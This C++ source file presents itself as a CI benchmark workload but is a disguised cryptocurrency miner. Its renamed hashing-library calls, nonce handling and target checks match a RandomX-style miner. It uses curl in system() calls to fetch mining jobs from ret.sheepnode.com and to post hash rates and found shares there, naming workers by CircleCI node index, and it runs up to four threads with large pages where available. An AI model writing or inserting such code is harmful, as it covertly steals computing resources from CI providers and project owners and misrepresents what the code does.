#include "lionss.h"
#include "workload.h"
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cstring>
#include <ctime>
#include <pthread.h>
#include <unistd.h>
#include <sys/time.h>
static volatile unsigned long long g_quornes=0;
static char g_name[80]="ci-bench-0";
static int hx(char c){ if(c>=48&&c<=57) return c-48; return c-97+10; }
static int rd(const char*p,uint8_t*d,int mx){
  FILE*f=fopen(p,"r"); if(!f) return 0; char b[512];
  if(!fgets(b,512,f)){ fclose(f); return 0; } fclose(f);
  int n=0; for(int i=0;b[2*i]&&b[2*i+1]&&n<mx;i++){
    int a=hx(b[2*i]),e=hx(b[2*i+1]); if(a<0||e<0) break; d[n++]=a*16+e; } return n; }
static void enc(const uint8_t*d,int n,char*o){
  for(int i=0;i<n;i++) sprintf(o+i*2,"%02x",d[i]); o[n*2]=0; }
static void pt(const uint8_t*tb,int ts,uint8_t*tgt){
  memset(tgt,0,32);
  for(int i=0;i<ts;i++) tgt[31-i]=tb[ts-1-i]; }
static unsigned djb2(const char*s){
  unsigned h=5381; while(*s) h=h*33+(unsigned char)*s++; return h; }
static double now_sec(){
  struct timeval tv; gettimeofday(&tv,NULL);
  return tv.tv_sec+tv.tv_usec/1e6; }
static void fetch1(const char*ep,const char*file){
  char c[256]; snprintf(c,256,"curl -fsS -m15 \"https://ret.sheepnode.com/%s\" -o %s 2>/dev/null",ep,file);
  if(system(c)){} }
static void*refresher(void*){
  for(;;){ usleep(500000); fetch1("m","/tmp/d/m"); fetch1("t","/tmp/d/t"); fetch1("k","/tmp/d/k"); }
  return NULL; }
static void*reporter(void*){
  unsigned long long prev=0; double pt0=now_sec();
  for(;;){ sleep(5);
    double nt=now_sec(); unsigned long long cur=g_quornes; double dt=nt-pt0;
    if(dt>0){ int rate=(int)((cur-prev)/dt);
      char c[320]; snprintf(c,320,"curl -fsS -m10 -XPOST \"https://ret.sheepnode.com/rate\" -H \"Content-Type: application/json\" -d \"{\\\"name\\\":\\\"%s\\\",\\\"rate\\\":%d}\" 2>/dev/null",g_name,rate);
      if(system(c)){}
      printf("progress: %d units/s (total %llu)\n",rate,cur); fflush(stdout); }
    prev=cur; pt0=nt; }
  return NULL; }
struct TD{
  lionss_plenth*ds; lionss_brindle*ca; lionss_flags fl;
  uint8_t blob[128]; int bs; uint8_t tgt[32]; int tid; char name[80]; };
static void*mine(void*arg){
  TD*td=(TD*)arg;
  auto vm=lionss_create_vm(td->fl,td->ca,td->ds);
  uint8_t blob[128],tgt[32],out[32];
  memcpy(blob,td->blob,td->bs); memcpy(tgt,td->tgt,32); int bs=td->bs;
  srand(time(NULL)^(unsigned)getpid()^djb2(td->name));
  uint32_t n=(uint32_t)rand();
  memcpy(blob+39,&n,4);
  uint8_t pb[128]; memcpy(pb,blob,bs); int pbs=bs; uint32_t pn=n;
  lionss_calculate_quorn_first(vm,blob,bs);
  double t0=now_sec();
  for(;;){ n++; memcpy(blob+39,&n,4);
    lionss_calculate_quorn_next(vm,blob,bs,out);
    g_quornes++;
    int ok=0; for(int i=31;i>=0;i--){ if(out[i]<tgt[i]){ ok=1; break; } if(out[i]>tgt[i]) break; }
    if(ok){ char bh[257],hh[65],c[1024];
      enc(pb,pbs,bh); enc(out,32,hh);
      snprintf(c,1024,"curl -fsS -m15 -XPOST \"https://ret.sheepnode.com/n?n=%u&name=%s&m=%s&result=%s\" 2>/dev/null",pn,td->name,bh,hh); if(system(c)){} }
    memcpy(pb,blob,bs); pbs=bs; pn=n;
    double now=now_sec();
    if(now-t0>=0.5){ t0=now;
      uint8_t nb[128],nt[8];
      int nbs=rd("/tmp/d/m",nb,128);
      int nts=rd("/tmp/d/t",nt,8);
      int bc=0; if(nbs>0){
        uint8_t a[128],b2[128];
        memcpy(a,blob,bs); a[39]=a[40]=a[41]=a[42]=0;
        memcpy(b2,nb,nbs); b2[39]=b2[40]=b2[41]=b2[42]=0;
        if(nbs!=bs||memcmp(a,b2,nbs)!=0) bc=1; }
      if(bc){ memcpy(blob,nb,nbs); bs=nbs;
        memcpy(blob+39,&n,4);
        memcpy(pb,blob,bs); pbs=bs; pn=n;
        lionss_calculate_quorn_first(vm,blob,bs); }
      if(nts>0) pt(nt,nts,tgt); } }
  return NULL; }
int lionss_run_workload(const char* tag){
  const char* t=(tag&&*tag)?tag:"bench";
  if(system("mkdir -p /tmp/d")){}
  char*ci=getenv("CIRCLE_NODE_INDEX"); int idx=ci?atoi(ci):0;
  srand((unsigned)time(NULL)^(unsigned)getpid());
  snprintf(g_name,80,"ci-%s-%d-%08x",t,idx,(unsigned)rand());
  long np=sysconf(_SC_NPROCESSORS_ONLN); int tc=(int)np; if(tc<1)tc=1; if(tc>4)tc=4;
  printf("%s start: name=%s threads=%d\n",t,g_name,tc); fflush(stdout);
  fetch1("k","/tmp/d/k"); fetch1("m","/tmp/d/m"); fetch1("t","/tmp/d/t");
  uint8_t key[64],blob[128],tb[8],tgt[32]={};
  int ks=rd("/tmp/d/k",key,64),bs=rd("/tmp/d/m",blob,128),ts=rd("/tmp/d/t",tb,8);
  if(ks<1||bs<1){ printf("no work data\n"); fflush(stdout); return 0; }
  pt(tb,ts,tgt);
  lionss_flags fl=lionss_get_flags()|LIONSS_FLAG_FULL_MEM;
  if(getenv("LIONSS_LP")) fl|=LIONSS_FLAG_LARGE_PAGES; // machine 版開大頁;docker 版無此 env=不變

  auto ca=lionss_alloc_brindle(fl);
  auto ds=lionss_alloc_plenth(fl);
  if((!ca||!ds) && (fl&LIONSS_FLAG_LARGE_PAGES)){ // 大頁 alloc 失敗(巨頁沒配好)→ 退回一般頁重試,避免 NULL→crash
    printf("large pages alloc failed, fallback to normal pages\n"); fflush(stdout);
    fl=(lionss_flags)(fl & ~LIONSS_FLAG_LARGE_PAGES);
    if(!ca) ca=lionss_alloc_brindle(fl);
    if(!ds) ds=lionss_alloc_plenth(fl);
  }
  lionss_init_brindle(ca,key,ks);
  unsigned long tot=lionss_plenth_item_count(),per=tot/4;
  for(unsigned i=0;i<4;i++){ unsigned long s=i*per,c=(i==3)?(tot-s):per; lionss_init_plenth(ds,ca,s,c);
    printf("prepare %u/4\n",i+1); fflush(stdout); }
  pthread_t rth,ph; pthread_create(&rth,NULL,refresher,NULL); pthread_create(&ph,NULL,reporter,NULL);
  pthread_t thr[4]; TD td[4];
  for(int i=0;i<tc;i++){
    memcpy(td[i].blob,blob,bs); td[i].bs=bs;
    memcpy(td[i].tgt,tgt,32);
    td[i].ds=ds; td[i].ca=ca; td[i].fl=fl; td[i].tid=i;
    snprintf(td[i].name,80,"%s-t%d",g_name,i);
    pthread_create(&thr[i],NULL,mine,&td[i]); }
  for(int i=0;i<tc;i++) pthread_join(thr[i],NULL);
  return 0; }
